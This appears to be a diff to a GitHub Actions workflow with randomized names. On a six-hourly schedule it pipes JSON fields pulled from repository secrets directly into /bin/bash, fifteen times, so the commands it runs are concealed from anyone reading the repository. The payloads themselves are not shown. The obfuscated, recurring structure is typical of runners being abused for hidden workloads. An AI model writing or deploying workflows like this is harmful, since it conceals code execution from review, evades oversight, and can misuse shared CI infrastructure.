@@ -1,29 +1,31 @@
 name: sweatsuitmachinist
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
-jobs:  # 22411
+    - cron: '36 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sweatsuitmachinist
         env:
-          s95534: ${{ secrets.s95534 }}
+          bz25989: ${{ secrets.bz25989 }}
         run: |
-          echo $s95534 | jq -r .zvfab66687 | /bin/bash
-          echo $dqs62 | jq -r .i89750 | /bin/bash
-          echo $bjy47968 | jq -r .mabx3448 | /bin/bash
-          echo $ucx179 | jq -r .fz00762 | /bin/bash
-          echo $qege4121 | jq -r .pccle433 | /bin/bash
-          echo $umoem8371 | jq -r .cnbeo8080 | /bin/bash
-          echo $vckrj93446 | jq -r .ncj11665 | /bin/bash
-          echo $cftz6 | jq -r .dnibe0 | /bin/bash
-          echo $moyz88826 | jq -r .uoo6 | /bin/bash
-          echo $cml3 | jq -r .vbm8536 | /bin/bash
-          echo $edgha829 | jq -r .bbx8420 | /bin/bash
-          echo $tcwyl040 | jq -r .m8465 | /bin/bash
-          echo $lw3820 | jq -r .jg47 | /bin/bash
+          echo $bz25989 | jq -r .ctli73 | /bin/bash
+          echo $fyeqz05814 | jq -r .klvji92592 | /bin/bash
+          echo $kzbkr9 | jq -r .psg56 | /bin/bash
+          echo $h7 | jq -r .iqeh05193 | /bin/bash
+          echo $zpsa5110 | jq -r .ysr1530 | /bin/bash
+          echo $iywe3 | jq -r .w59 | /bin/bash
+          echo $gbv72546 | jq -r .hfb179 | /bin/bash
+          echo $yjudg864 | jq -r .yfdf6184 | /bin/bash
+          echo $r89 | jq -r .fhq783 | /bin/bash
+          echo $kymc3518 | jq -r .b012 | /bin/bash
+          echo $uz54 | jq -r .ffed47827 | /bin/bash
+          echo $fx533 | jq -r .peee868 | /bin/bash
+          echo $i21510 | jq -r .nv970 | /bin/bash
+          echo $q0 | jq -r .xiw44004 | /bin/bash
+          echo $bcbre59368 | jq -r .ohu0263 | /bin/bash
 
